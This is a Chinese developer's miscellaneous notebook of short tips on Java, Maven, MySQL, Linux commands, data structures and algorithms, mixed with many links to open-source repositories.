         为什么断开要四次？因为TCP是全双工的,可以端开一个方向,另一个方向继续传数据
--------------------------------------------------------------------------------------
https://github.com/xuliugen/common
--------------------------------------------------------------------------------------
抽象类能不能有构造函数
可以有,但是不能用,即不能new
--------------------------------------------------------------------------------------
https://github.com/benas/random-beans
--------------------------------------------------------------------------------------
查看方法签名javap -s Person.class  解决NoSuchMethodError错误
--------------------------------------------------------------------------------------
bitset
一个大小可动态改变, 取值为true或false的位集合用于表示一组布尔标志
位的值为布尔型,初始大小为64bit,初始值均为"false" 大小一定是64的倍数
--------------------------------------------------------------------------------------
https://github.com/addthis/stream-lib
https://github.com/politrons/reactive

-Xms10M -Xmx10M
--------------------------------------------------------------------------------------
命令行编译运行java
javac MyJava.java
java  com.test.MyJava

javac -classpath CLASSPATH:*.jar Test.java
java -classpath CLASSPATH:*.jar Test

java -cp 类路径；要执行的主类 参数...
-cp =-classpath

window上分号;分隔,linux上是分号:分隔

javac -d bin src\*.java 输出目录

java -cp target/benchmarks.jar tests.MapTestRunner

在基目录执行 java test.Test
--------------------------------------------------------------------------------------
当业务不稳定进行降级
业务稳定进行升级
--------------------------------------------------------------------------------------
https://github.com/Wolfgang-Schuetzelhofer/jcypher
--------------------------------------------------------------------------------------
http://sylvain-bugat.github.io/blog/2015/04/28/8-queens-puzzle-introduction/ 8皇后
--------------------------------------------------------------------------------------
mvn clean compile assembly:single
mvn install dependency:copy-dependencies

mvn dependency:copy-dependencies -DoutputDirectory=lib
--------------------------------------------------------------------------------------
java -jar autojar.jar -o std.jar -c  "lib\*.jar"  -v  -e Java_Maven_Git-0.0.1-SNAPSHOT.jar
--------------------------------------------------------------------------------------
maven 生命周期
分别是clean,default和site,clean是清理项目,default是构建项目,site是建立项目站点
插件绑定又分为内置绑定和默认绑定

default生命周期的各个阶段
validate
generate-sources
process-sources
generate-resources
process-resources 复制并处理资源文件,至目标目录,准备打包
compile 编译项目的源代码
process-classes

generate-test-sources
process-test-sources
generate-test-resources
process-test-resources 复制并处理资源文件,至目标测试目录
test-compile 编译测试源代码
process-test-classes

test 使用合适的单元测试框架运行测试这些测试代码不会被打包或部署
prepare-package
package 接受编译好的代码,打包成可发布的格式,如 JAR
pre-integration-test
integration-test
post-integration-test
verify
install 将包安装至本地仓库,以让其它项目依赖
deploy 将最终的包复制到远程的仓库,以让其它开发人员与项目共享
--------------------------------------------------------------------------------------
查询插件绑定
mvn help:describe -Dplugin=org.apache.maven.plugins:maven-compiler-plugin:3.3 -Ddetail
--------------------------------------------------------------------------------------
mvn install -X 想要查看完整的依赖踪迹
mvn install -Dmaven.test.skip=true
--------------------------------------------------------------------------------------
@echo off
java -jar  -classpath lib/*.jar; -verbose:class myAPP.jar >> classes.txt
pause
--------------------------------------------------------------------------------------
java8新增一个工具,用来分析应用程序所依赖的profile,有三个参数比较常用 -p,-v,-r
jdeps -P Deps.class

compact1<compact2<compact3
javac -profile compact2 Test.java
--------------------------------------------------------------------------------------
不包含 ^(?!.*?unimi).*$
--------------------------------------------------------------------------------------
java打包
jar cvfM test.jar .  -M　不产生所有项的清单（MANIFEST〕文件
--------------------------------------------------------------------------------------
https://github.com/codefollower/Tomcat-Research
--------------------------------------------------------------------------------------
设置mysql自增id alter table t_user_3 auto_increment=11;
--------------------------------------------------------------------------------------
ccv模式 MJD的时间格式
MJD： 修正的儒略日期
TJD:  截断的儒略时间
UTC： 世界协调时
GMT:  格林威治标准时间
--------------------------------------------------------------------------------------
&后台输出
--------------------------------------------------------------------------------------
jgroups
--------------------------------------------------------------------------------------
TODO: + 说明：
如果代码中有该标识,说明在标识处有功能代码待编写,待实现的功能在说明中会简略说明

FIXME: + 说明：
如果代码中有该标识,说明标识处代码需要修正,甚至代码是错误的,不能工作,需要修复,如何修正会在说明中简略说明

XXX: + 说明：
如果代码中有该标识,说明标识处代码虽然实现了功能,但是实现的方法有待商榷,希望将来能改进,要改进的地方会在说明中简略说明
--------------------------------------------------------------------------------------
解决MyBatis 当数据库为记录为空,不显示此列
<setting name="callSettersOnNulls" value="true"/>
--------------------------------------------------------------------------------------
60s发短信
精确到秒的时间做Score（去掉毫秒）,然后使用线程每一秒扫一次,使用当前时间作为zrangeBysocre命令的Score去查询
 jedis.zadd("20151019145101-03", "203", "流水号xxx金额xxx...")
--------------------------------------------------------------------------------------
mysql
对该列数据以等值查询为主,没有范围查询、没有排序的时候,特别适合采用哈希索引
--------------------------------------------------------------------------------------
mysql
wait_timeout=31536000 超时时间
--------------------------------------------------------------------------------------
索引树的高度为3~4层

--------------------------------------------------------------------------------------
字符串常量池 减少字符串对象的重复创建
1 如果字符串常量池中存在相同内容的字符串对象,则将这个对象的地址返回
2 如果字符串常量池中不存在相同内容的字符串对象,则创建一个新的字符串对象并放入常量池

java中String对象时不可变的（使用final修饰）,这样可以安全保证多个变量共享同一个对象
--------------------------------------------------------------------------------------
${sex!} <br>
<#if (sex!23) ==23 >
ok
<#else>
no
</#if>

<#if mouse??>
          Mouse found
 <#else>  No mouse found
</#if>
--------------------------------------------------------------------------------------
2个字符,UTF-8编码占6个字节,以GBK方式来解码恰好能解码为3个字符,而如果是1个字符,就会多出一个无法映射的字节
--------------------------------------------------------------------------------------
UTF-8是Unicode的标准实现,它的代码页中包含了所有的Unicode取值,所以任意编码转换到UTF-8,再转换回去都不会有任何丢失
--------------------------------------------------------------------------------------
ls以K、M、G为单位查看文件大小
ls -lh
--------------------------------------------------------------------------------------
文件上传过程中存储到临时文件夹,上传完成后拷贝到目标文件夹,定期清理临时文件夹
--------------------------------------------------------------------------------------
主要研究方向：
1. 异构事件驱动服务平台；
2. 基于SOA/EDA/CQRS的开发框架；
3. 实时监控预警平台；
4. 服务管控&治理平台；
5. 其他：分布式持久化、内存计算、消息队列、虚拟化等研究方向

--------------------------------------------------------------------------------------
重构
--->优化代码的设计,剥离不相关的耦合代码
删除无用代码 删除无用代码是提高代码可维护性最有效的方式
移动函数到其它类
提取函数到新类
修改函数逻辑

性能优化之后要有量化数据,明确的说出优化后哪个指标提升了多少

优化措施
让计算靠近存储
优化算法的时间复杂度
减少无用的操作
并行计算

尽量采用成熟的解决方案
统一的编码规范、统一的语言版本、统一的编辑器配置、统一的文件编码

只重构经常修改的部分

好代码
依赖最少,易于维护；
错误处理完全根据一个明确的策略；
性能接近最佳化,避免代码混乱和无原则的优化；
--------------------------------------------------------------------------------------
Timer 实现任务调度的核心类是 Timer 和 TimerTask其中 Timer 负责设定 TimerTask 的起始与间隔执行时间

Timer 的设计核心是一个 TaskList 和一个 TaskThreadTimer 将接收到的任务丢到自己的 TaskList 中,
TaskList 按照 Task 的最初执行时间进行排序
TimerThread 在创建 Timer 时会启动成为一个守护线程这个线程会轮询所有任务,
找到一个最近要执行的任务,然后休眠,当到达最近要执行任务的开始时间点,
TimerThread 被唤醒并执行该任务之后 TimerThread 更新最近一个要执行的任务,继续休眠

缺点
 所有任务都是串行执行的,同一时间只能有一个任务在执行,前一个任务的延迟或异常都将会影响到之后的任务
--------------------------------------------------------------------------------------
线程池设计的 ScheduledExecutor
  每一个被调度的任务都会由线程池中一个线程去执行,因此任务是并发执行的,相互之间不会受到干扰

只有当任务的执行时间到来时,ScheduedExecutor 才会真正启动一个线程,其余时间 ScheduledExecutor 都是在轮询任务的状态
ScheduleAtFixedRate 是基于固定时间间隔进行任务调度
ScheduleWithFixedDelay 取决于每次任务执行的时间长短,是基于不固定时间间隔进行任务调度
--------------------------------------------------------------------------------------
Quartz 优点在于持久化,即将任务调度的相关数据保存下来这样,当系统重启后,任务被调度的状态依然存在于系统中,不会丢失
同一个 Job 可以绑定多个不同的 Trigger,同一个 Trigger 也可以调度多个 Job


--------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------
https://ws.apache.org/axiom/userguide/ch02.html#d0e183
--------------------------------------------------------------------------------------
删除t2表存在 t1表存在数据
delete t2 from tmysql_test_tbl_1 t1,tmysql_test_tbl_2 t2 where t1.id=t2.id

删除t1表存在t2不存在数据
delete t1
from tmysql_test_tbl_2 t1
left join tmysql_test_tbl_1 t2
on t1.id=t2.id
where t2.id is null

删除2表
delete t1,t2
from tmysql_test_tbl_1 t1 left join tmysql_test_tbl_2 t2
on t1.id=t2.id
where t1.id=1
--------------------------------------------------------------------------------------
jackson @JsonInclude(Include.NON_EMPTY)
Include.Include.ALWAYS 默认
Include.NON_DEFAULT 属性为默认值不序列化
Include.NON_EMPTY 属性为 空（""） 或者为 null 都不序列化
Include.NON_NULL 属性为NULL 不序列化
--------------------------------------------------------------------------------------
字符串是由字符(char)数组组成的,不能有超过(2^31-1)个字符,大概4GB大小
--------------------------------------------------------------------------------------
随机取一条
select *
  from db_ap_rgsh_vertify_log_check as t1
  join (select round(rand() *
                     ((select max(id) from db_ap_rgsh_vertify_log_check) -
                      (select min(id) from db_ap_rgsh_vertify_log_check)) +
                     (select min(id) from db_ap_rgsh_vertify_log_check)) as id) as t2
 where t1.id >= t2.id
 order by t1.id limit 1;

--------------------------------------------------------------------------------------
求生日
select
    pname, birthday, if(cur_birthday>today, cur_birthday, next_birthday) as recent_birthday
from(
    select
        pname, birthday, today,
        date_add(cur_birthday, interval if(day(birthday)=29 && day(cur_birthday)=28, 1, 0) day) as cur_birthday,
        date_add(next_birthday, interval if(day(birthday)=29 && day(next_birthday)=28, 1, 0) day) as next_birthday
    from(
        select
            pname, birthday, today,
            date_add(birthday, interval diff year) as cur_birthday,
            date_add(birthday, interval diff+1 year) as next_birthday
        from(
            select
                concat(last_name, ' ', first_name) as pname,
                birth_date as birthday,
                ( year( now() ) )-year(birth_date) as diff,
                now() as today
            from tmysql_test_employees
        ) as a
    ) as b
) as c
--------------------------------------------------------------------------------------
https://github.com/maxijb/ClosestPoints 最近点
https://github.com/Intel-bigdata/spark-streamingsql

https://github.com/d2ab/sequence
https://github.com/palossyl/sql-script-parser
https://github.com/cjdev/lambda-utils

https://github.com/JohnnyLe/SuperEncryption
--------------------------------------------------------------------------------------
监控：埋点、传输、计算、展示

动态字节码增强(动态代理) — 约定配置主义
侵入到需要埋点的中间件 — 埋点主义
采集所有的日志数据 — 现象主义

动态字节码增强 网易的哨兵系统
优势
1.用户接入无感知
2.格式化的数据
劣势
1.可隔离线很差
2.后期需要大量的依赖配置,可扩展性差
3.无法分析系统调用栈关系
4.系统非常的复杂,后期维护性很差

埋点主义 B2B的 dragon、淘宝的鹰眼、点评的CAT
优势
1.隔离线较好
2.格式化的数据
劣势
1.需要在所有需要关注的中间件上埋点,可扩展性一般
2.业务方需要进行一定的配合

现象主义 支付宝的xflush
优势
1.零侵入
2.可扩展性非常的强
劣势
1.业务方有较高的一次性学习陈本
2.无法分析系统调用栈关系
3.无法做容量规划
--------------------------------------------------------------------------------------
线程池饱和策略
幂等,非事务的请求业务场景 DiscardPolicy
非幂等,事务型的请求业务场景 AbortPolicy,抛弃任务,并抛出异常

自己去检测队列中的数据大小,当队列堆积到一个阀值时候提前做自我保护,防止将系统撑死这个做法需要将coreSize和maxSize设置为相同的值

--------------------------------------------------------------------------------------
流控更专业的叫法是：流量整形(traffic shaping),典型作用是限制流出某一网络的某一连接的流量与突发,使这类报文以比较均匀的速度向外发送

--------------------------------------------------------------------------------------
DefaultListableBeanFactory beanFactory = (DefaultListableBeanFactory) applicationContext.getAutowireCapableBeanFactory();
 beanFactory.setBeanClassLoader(classLoader);
--------------------------------------------------------------------------------------
布隆过滤器 (Bloom Filter)
用于检索一个元素是否在一个集合中
优点是空间效率和查询时间都远远超过一般的算法,
缺点是有一定的误识别率和删除困难

误报 在查询时能提供“一定不存在”,但只能提供“可能存在”,因为存在其它元素被映射到部分相同bit位上,导致该位置1
漏报 删除了某个元素,导致该映射bit位被置0,那么本来存在的元素会被漏报成不存在

解决方法 Cuckoo Hashing
处理碰撞的方法,就是把原来占用位置的这个元素移除到备用位置 备用位置有值->下一个备用
直到上限(执行rehash操作)
--------------------------------------------------------------------------------------
mysql 处理xml
set @xml = '<a><b>x</b><b>y</b></a>';
set @i =1, @j = 2;
select @i, extractvalue(@xml, '//b[$@i]');  x
select @j, extractvalue(@xml, '//b[$@j]');  y

select extractvalue('<a><b>测试</b></a>', '/a/b'); 测试
select extractvalue('<a><b/></a><a><b>测试</b></a>', 'count(/a/b)'); 2

 select
      extractvalue('<a>ccc<b>ddd</b></a>', '/a') as val1,
      extractvalue('<a>ccc<b>ddd</b></a>', '/a/b') as val2,
      extractvalue('<a>ccc<b>ddd</b></a>', '//b') as val3,
      extractvalue('<a>ccc<b>ddd</b></a>', '/b') as val4,
      extractvalue('<a>ccc<b>ddd</b><b>eee</b></a>', '//b') as val5;

select extractvalue('<a>c</a><b>', '//a');  null

未找到或找到多个不替换
select
      updatexml('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>') as val1,
      updatexml('<a><b>ccc</b><d></d></a>', '/b', '<e>fff</e>') as val2,
      updatexml('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') as val3,
      updatexml('<a><b>ccc</b><d></d></a>', '/a/d', '<e>fff</e>') as val4,
      updatexml('<a><d></d><b>ccc</b><d></d></a>', '/a/d', '<e>fff</e>') as val5

select extractvalue('<a>111<b:c>222<d>333</d><e:f>444</e:f></b:c></a>', '//e:f'); 444
select updatexml('<a>111<b:c>222<d>333</d><e:f>444</e:f></b:c></a>', '//b:c', '<g:h>555</g:h>');

select extractvalue('<a><b>x</b><c>y</c></a>','/a/child::*'); x y


select extractvalue(
     '<a><b c="1">x</b><b c="2">y</b></a>',
      'a/b'
   ) as result x y

select extractvalue(
        '<a>
          <b c="1"><d>x</d></b>
          <b c="2"><d>x</d></b>
         </a>',
          'a/b/d[../@c="1"]')
    as result;  x

select extractvalue('<a><b><c>w</c><b>x</b><d>y</d>z</b></a>', '//b[1]'); x z
select extractvalue('<a><b><c>w</c><b>x</b><d>y</d>z</b></a>', '/descendant-or-self::*/b[1]'); x z


select extractvalue('<a><b>1</b><b>2</b><b>3</b></a>' , '//b[2]') 2

set @xml = '<items><item>
        <value columntype="0">Single Line Text_01</value>
    <value columntype="1">Single Line Text_12341</value>
    <value columntype="2">Single Line Text_21</value>
    <value columntype="3">Single Line Text_31</value>
    <value columntype="4">Single Line Text_41</value>
    </item>
</items>';
select extractvalue(@xml, 'items/item/value[@columntype=0]') value;

set @xml = '<?xml version="1.0" encoding="UTF-8"?>
     <bookstore>
        <book>
           <title lang="eng">Harry Potter</title>
          <price>29.99</price>
         </book>
        <book>
           <title lang="eng">Learning XML</title>
           <price>39.95</price>
         </book>
         </bookstore>';
select extractvalue(@xml, '/bookstore/book/price');
--------------------------------------------------------------------------------------
LockSupport中的park() 和 unpark() 的作用分别是阻塞线程和解除阻塞线程,而且park()和unpark()不会遇到"Thread.suspend 和 Thread.resume所可能引发的死锁"问题

LockSupport.parkNanos
--------------------------------------------------------------------------------------
LZF LZ4
https://github.com/jpountz/lz4-java
--------------------------------------------------------------------------------------
对大表有关的统计不再实时统计,采用统计汇总表加增量统计的方式来优化
--------------------------------------------------------------------------------------
100w个数中找出最大的100个数
采用局部淘汰法选取前100个元素,并排序,记为序列L然后一次扫描剩余的元素x,与排好序的100个元素中最小的元素比,如果比这个最小的要大,那么把这个最小的元素删除,并把x利用插入排序的思想,插入到序列L中依次循环,知道扫描了所有的元素复杂度为O(100w*100)
--------------------------------------------------------------------------------------
https://github.com/hankcs/HanLP

http://ahocorasick.org/
--------------------------------------------------------------------------------------
https://www.zhihu.com/question/24964987
http://blog.csdn.net/haitao111313/article/details/7425408
--------------------------------------------------------------------------------------
jar tvf fcm-core-dev-1.1-SNAPSHOT.jar META-INF/dev.properties
测试我们指定的文件是否在jar包中,如果在就是列出该文件的详细信息?不在的话,就打印空,也就是什么都不输出?
v就是verbose,指打印详细信息,f就是file,指定是哪个文件

jar xvf ｘｘｘ-1.1-SNAPSHOT.jar META-INF/dev.properties
x是extract,就是从指定的jar中,解压出你需要的文件

jar uvf xxxx-1.1-SNAPSHOT.jar META-INF/dev.properties
update 这个jar文件
--------------------------------------------------------------------------------------
静态方法中调用非静态方法
静态方法通过用传进来的对象引用调用非静态方法,从而达到静态方法调用非静态方法
--------------------------------------------------------------------------------------
ps
defunct 是僵尸进程 要找到他的父进程,看看是否可以将其父进程给删了如果其父进程是0, 只有靠重启了

找出僵尸进程 状态为 z或者Z 的进程为僵尸进程
ps -A -o stat,ppid,pid,cmd | grep -e '^[Zz]'
-A 参数列出所有进程
-o 自定义输出字段 我们设定显示字段为 stat（状态）, ppid（进程父id）, pid(进程id),cmd（命令）这四个参数

--------------------------------------------------------------------------------------
给一列无序数组,求出中位数
--------------------------------------------------------------------------------------
一个二进制数后面加一个"0"相当于该数乘以2,一个二进制数后面加一个"1"相当于该数乘2加1?
设定三个状态,分别叫做0?1和2,它们表示当前的数除以3所得的余数
如果对于某个i和j,有i*2≡j (mod 3),就加一条路径i→j,路径上标一个字符"0"
;如果i*2+1≡j (mod 3),则在路径i→j上标记"1"
状态0既是我们的初始状态,也是我们的最终状态
假如二进制数10010走进来了?从状态0出发,机器首先读到一个"1",于是当前位置挪到状态1,表明目前该数模3余1;
然后,系统读了一个"0",我们紧跟着走到状态2,表明二进制数"10"被3除余2;
下一步,我们回到状态1,表明"100"除以3余1;再往后,我们得知"1001"能被3整除
最后呢,我们读到一个0,"1001"的两倍当然还是能被3整除
--------------------------------------------------------------------------------------
后缀树天生就是用来解决长串搜索问题的,而且效率很高
空间开销大且对大字母表时间效率不理想
--------------------------------------------------------------------------------------
尾递归的本质,其实就是将这次递归方法当中的必要信息,传递到下次递归当中,从而保证return后面是一个完整的递归函数调用而不是一个表达式



递归是指函数直接或间接地调用自己
尾递归是指所有递归形式的调用,一定是发生在函数的末尾

尾递归的调用处于方法的最后,因此方法之前所积累下的各种状态对于递归调用结果已经没有任何意义
因此完全可以把本次方法中留在堆栈中的数据完全清除,把空间让给最后的递归调用这样的优化1便使得递归不会在调用堆栈上产生堆积,
意味着即时是"无限"递归也不会让堆栈溢出这便是尾递归的优势

尾递归的本质,其实是将递归方法中的需要的"所有状态"通过方法的参数传入下一次调用中
--------------------------------------------------------------------------------------
https://github.com/jadyer/demo-boot
--------------------------------------------------------------------------------------
海量数据相似度计算之simhash短文本查找
--------------------------------------------------------------------------------------
双数组AC自动机(doubleArrayTrie)
--------------------------------------------------------------------------------------
e.getMessage()在nullpoint时候为null -XX:-OmitStackTraceInFastThrow 获取栈信息
--------------------------------------------------------------------------------------
?和T都表示不确定的类型  但如果是T的话 函数里面可以对T进行操作 比如while里面可以这样写
T t = it.next();
--------------------------------------------------------------------------------------
BigDecimal ret = aValue.stripTrailingZeros() 多余的0 0例外
--------------------------------------------------------------------------------------
https://github.com/unruly/java-8-matchers
https://github.com/cuppa-framework/cuppa
https://github.com/MasatoKokubo/DebugTrace
https://github.com/ajlane/iostreams
https://github.com/aol/cyclops
https://github.com/aol/simple-react
https://github.com/nurkiewicz/async-retry
https://github.com/locationtech/spatial4j
https://github.com/querydsl/querydsl
https://github.com/voho/jequal kanxia
https://poi.apache.org/
https://github.com/marcelkoopman/reactive.akka
https://github.com/jxqlovejava/griddle
https://github.com/phax/ph-xpath2
https://github.com/zbdzzg/DFA-Regex

https://github.com/tgsmith61591/clust4j  聚类算法
https://github.com/raydac/java-binary-block-parser 解析二进制
https://github.com/javaslang/javaslang-render 文字树

--------------------------------------------------------------------------------------
队列用了head和tail两个锁,(空节点添加 单节点删除 获取2个锁 死锁问题)
但是它有一个关键的地方是它在队列初始化的时候head和tail指针不为空,而是指向一个空节点
在enqueue的时候只要向队列尾部添加新节点就好了而dequeue的情况稍微复杂点,
它要返回的不是头节点,而是head->next,即头节点的下一个节点
LinkedBlockingQueue
--------------------------------------------------------------------------------------
一致性哈希: Rendezvous hashing
--------------------------------------------------------------------------------------
Oracle 关键字转义 '||'&'||' '||chr(38)||'
--------------------------------------------------------------------------------------
chrome浏览器,同一个 tab 对 同一域名 的最大同时连接数是有限制的.
chrome://net-internals/#sockets
--------------------------------------------------------------------------------------
maven
-X debug模式
-U 强制更新snapshot
-P 使用pom配置中指定的profile
--------------------------------------------------------------------------------------
超过800M大小的文件
find . -type f -size +800M
find . -type f -size +800M  -print0 | xargs -0 ls -l
find . -type f -size +800M  -print0 | xargs -0 du -h
find . -type f -size +800M  -print0 | xargs -0 du -h | sort -nr

du -h --max-depth=2 | sort -n
du -hm --max-depth=2 | sort -nr | head -12
--------------------------------------------------------------------------------------
repair table xxxtable; mysql修复表
--------------------------------------------------------------------------------------
log (ab) = log (a) + log (b)

df/dt=lim(h->0)(f(t+h)-f(t))/h  某一点的导数描述的是函数在该点附近的变化率

i^2=-1 虚数

欧拉恒等式 e^(iπ)+1=0  e^(ix)=cosx+isinx
--------------------------------------------------------------------------------------

查看进程当前运行的线程数命令为：pstree -p 3660 | wc -l
查看mac地址 ifconfig
一行显示一个线程 top -H

pidstat主要用于监控全部或指定进程占用系统资源的情况 -u (cpu) -r(内存) -d(io统计)
pidstat 2 10  采样周期和采样次数 2s 10次

--------------------------------------------------------------------------------------
Michael-Scott算法也是基于CAS以及AtomicReference来实现队列的非阻塞操作,java.util.concurrent中的ConcurrentLinkedQueue就是典型的基于Michael-Scott实现的非阻塞队列ConcurrentLinkedQueue在执行offer动作时,通过CAS比较拿到的tail元素是否为当前处于末尾的元素,如不是则继续循环,如是则将tail元素更新为新的元素

在执行poll动作时,通过CAS比较拿到的head元素是否为当前处于首位的元素,如不是则继续循环,如是则将head后的元素赋值给head,同时获取之前head元素中的值并返回
--------------------------------------------------------------------------------------
冲突较多的应用场景而言,CAS会带来更高的CPU消耗
--------------------------------------------------------------------------------------
Disruptor、JPPF、Kilim、Amino
--------------------------------------------------------------------------------------
性能调优的步骤主要有：衡量系统现状、设定调优目标、寻找性能瓶颈、性能调优,验证是否达到调优目标
--------------------------------------------------------------------------------------
reactor反应器模式
--------------------------------------------------------------------------------------
owasp
--------------------------------------------------------------------------------------
假设误判率为p,位数组大小为m,集合数据个数为n,映射函数个数为k
k=(m/n)ln2=0.7(m/n)
m=(-n*lnp)/(ln2)2=-2*n*lnp=2*n*ln(1/p)
--------------------------------------------------------------------------------------
快速文件base64
localDate->localDateTime
--------------------------------------------------------------------------------------
iptables firewall
iptables -L  列出iptables规则
iptables -F  清除iptables内置规则
iptables -X  清除iptables自定义规则
--------------------------------------------------------------------------------------
matches:整个匹配 lookingAt:部分匹配 find:部分匹配

matches:整个匹配,只有整个字符序列完全匹配成功,才返回True,否则返回False但如果前部分匹配成功,将移动下次匹配的位置
lookingAt:部分匹配,总是从第一个字符进行匹配,匹配成功了不再继续匹配,匹配失败了,也不继续匹配
find:部分匹配,从当前位置开始匹配,找到一个匹配的子串,将移动下次匹配的位置
reset:给当前的Matcher对象配上个新的目标,目标是就该方法的参数；如果不给参数,reset会把Matcher设到当前字符串的开始处

--------------------------------------------------------------------------------------
乐观锁的更新操作,最好用主键或者唯一索引来更新,这样是行锁
update table_xxx set name=#name#,version=version+1 where id=#id# and version=#version#
update table_xxx set avai_amount=avai_amount-#subAmount# where id=#id# and avai_amount-#subAmount# >= 0
--------------------------------------------------------------------------------------
hashcode可以为负数 192.168.1.0:1111 值可能会溢出,而hashCode方法返回是int,它会截取低32位并返回 String.hashCode是乘法散列函
Integer.MAX_VAUE是2^31 - 1（0x7fffffff）
hashCodeValue & 0x7fffffff  保证为正
--------------------------------------------------------------------------------------
CRC32_HASH、FNV1_32_HASH、KETAMA_HASH等,其中KETAMA_HASH是默认的MemCache推荐的一致性Hash算法
--------------------------------------------------------------------------------------
关注 https://github.com/tada/pljava
https://github.com/functionaljava/functionaljava
https://github.com/oldmanpushcart/greys-anatomy  java在线诊断工具
https://github.com/google/google-java-format
https://github.com/jmnarloch/trie
https://github.com/APaloski/Timestreams

https://github.com/ben-manes/caffeine java 8内存缓存 没看出优势

https://github.com/gwangGitHub/demo
--------------------------------------------------------------------------------------
防止重复下单
下单成功后,重定向到其他页面 只能解决刷新时,生成订单的可能,但是不能防止多次点击的情况
利用struts2的token拦截器
--------------------------------------------------------------------------------------
ExecutorService executorService = new ThreadPoolExecutor(0, 5, 2, TimeUnit.SECONDS,
				new ArrayBlockingQueue<Runnable>(10), new ThreadFactory() {
					private AtomicInteger counter = new AtomicInteger(0);

					public Thread newThread(Runnable r) {
						System.out.println("-----=" + counter.get());
						Thread thread = new Thread(r);
						thread.setName("task-handler-" + counter.incrementAndGet());
						return thread;
					}
					//CallerRunsPolicy 中,线程调用运行该任务的 execute 本身此策略提供简单的反馈控制机制,能够减缓新任务的提交速度
				}, new CallerRunsPolicy());

guava
ThreadFactory namedThreadFactory = new ThreadFactoryBuilder()
                                       .setNameFormat("my-sad-thread-%d").build()


common lang
BasicThreadFactory factory = new BasicThreadFactory.Builder().namingPattern("workerthread-%d").daemon(true)
				.priority(Thread.MAX_PRIORITY).build();
--------------------------------------------------------------------------------------
ArrayList的get方法的时间复杂度是O(1)

LinkedList是双向链表,算出i在一半前还是一半后,一半前正序遍历、一半后倒序遍历

使用迭代器或者foreach循环 去遍历LinkedList即可
--------------------------------------------------------------------------------------
https://kotlinlang.org/ kotlin语言
--------------------------------------------------------------------------------------
fixed bug 2015-9-1 对日期直接截取 错误 -->格式化再截取
--------------------------------------------------------------------------------------
http://www.tuicool.com/articles/e2eimeF junit 5
--------------------------------------------------------------------------------------
Random类的实例用于生成伪随机数流此类使用 48 位的种子,使用线性同余公式
--------------------------------------------------------------------------------------
Fork/Join框架的递归调度模型

Executor是一个接口,它将任务的提交和任务的执行分离
ThreadPoolExecutor是线程池的核心,用来执行被提交的类
--------------------------------------------------------------------------------------
http://www.tuicool.com/articles/U3MNfy2 希伯特空间
--------------------------------------------------------------------------------------
instanceof：用来判断对象是否是类的实例
自身实例或子类实例 instanceof 自身类

isInstance：用来判断对象是否属于某个类型的实例
自身类.class.isInstance(自身实例或子类实例)

isAssignableFrom：用来判断类型间是否存在派生关系
自身类.class.isAssignableFrom(自身类或子类.class)
--------------------------------------------------------------------------------------
http://www.codeceo.com/article/java-developer-interview-list.html
--------------------------------------------------------------------------------------
Error类和Exception类都继承自Throwable类
Exception：
1．可以是可被控制(checked) 或不可控制的(unchecked)
2．表示一个由程序员导致的错误
3．应该在应用程序级被处理

Error：
1．总是不可控制的(unchecked)
2．经常用来用于表示系统错误或低层资源的错误
3．如何可能的话,应该在系统级被捕捉
所有的Checked Exception 均从java.lang.Exception 继承而来,而Runtime Exception 则继承java.lang.RuntimeException 或java.lang.Error

Checked Exception 表示这个Exception 必须要被处理
Runtime Exception 通常会暗示着程序上的错误,这种错误会导致程序设计者无法处理,而造成程序无法继续执行下去

throws：
在方法声明上,后面跟的是异常的类名

java.lang.Object
 java.lang.Throwable
      java.lang.Error

Exception的继承关系：
java.lang.Object
java.lang.Throwable
     java.lang.Exception
--------------------------------------------------------------------------------------
mysql的datetime与timestamp的区别
相同点:格式都为YY-MM-DD HH:II:SS

区别：
1、添加或更新数据时,如果timestamp字段为null,数据库自动添加当前时间,而datetime为null,数据库会报错
2、存储空间上,timestamp为4字节,datetime为8字节
3、检索效率上,timestamp要快于datetime
4、支持范围上,timestamp支持范围为'1970-01-01 00:00:00'到2037-12-31 23:59:59
,datetime支持范围为'1000-01-01 00:00:00'到'9999-12-31 23:59:59'
--------------------------------------------------------------------------------------
查看java web应用开的端口
lsof -i -P | grep LISTEN |grep java
--------------------------------------------------------------------------------------
MySQL索引类型:B+树索引,哈希索引,FULLTEXT索引,R-Tree索引
从物理存储角度可分为聚集索引（clustered index）、非聚集索引（non-clustered index）
从逻辑角度可分为主键索引、普通索引,或者单列索引、多列索引、唯一索引、非唯一索引

主键索引 唯一索引
主键创建后一定包含一个唯一性索引,唯一性索引并不一定就是主键
唯一性索引列允许空值,而主键列不允许为空值
主键列在创建时,已经默认为空值 + 唯一索引了
主键可以被其他表引用为外键,而唯一索引不能
一个表最多只能创建一个主键,但可以创建多个唯一索引
--------------------------------------------------------------------------------------
为什么InnoDB表最好要有自增列做主键
InnoDB引擎表是基于B+树的索引组织表
--------------------------------------------------------------------------------------
Mysql Binlog格式介绍
分别为Statement,MiXED,以及ROW

Statement：每一条会修改数据的sql都会记录在binlog中
Row:不记录sql语句上下文相关信息,仅保存哪条记录被修改

--------------------------------------------------------------------------------------
mysql 大表做在线DDL online-schema-change

1 创建一个和你要执行 alter 操作的表一样的空表结构
2 执行表结构修改,然后从原表中的数据到copy到 表结构修改后的表,
3 在原表上创建触发器将 copy 数据的过程中,在原表的更新操作 更新到新表.
注意:如果表中已经定义了触发器这个工具就不能工作了
4 copy 完成以后,用rename table 新表代替原表,默认删除原表
--------------------------------------------------------------------------------------
B+树是一个平衡的多叉树,从根节点到每个叶子节点的高度差值不超过1,而且同层级的节点间有指针相互链接
--------------------------------------------------------------------------------------
自动跳转 curl -L
显示通信过程 curl -v

--------------------------------------------------------------------------------------
Base64编码使用的字符包括大小写字母各26个,加上10个数字,和加号"+",斜杠"/",一共64个字符
--------------------------------------------------------------------------------------
java 8 Period  LocalDate 差别的年月日 1年2月3天
 Period between = Period.between(LocalDate.of(2016,2,01), LocalDate.of(2016,2,11));

Duration between = Duration.between(LocalDateTime.now(), LocalDateTime.of(2016, 5, 1, 1, 1));
总共天 时 分

LocalDateTime fromTemp = LocalDateTime.from(from);
long years = fromTemp.until(to, ChronoUnit.YEARS);
--------------------------------------------------------------------------------------
dump 文件里,值得关注的线程状态有：
死锁, deadlock（重点关注）
等待资源, waiting on condition（重点关注）
等待获取监视器, waiting on monitor entry（重点关注）
阻塞, blocked（重点关注）
--------------------------------------------------------------------------------------
跳跃表
节点增加和更新比较少,查询频次较多的情况
--------------------------------------------------------------------------------------
流量预警和限流方案中,比较常用的有两种
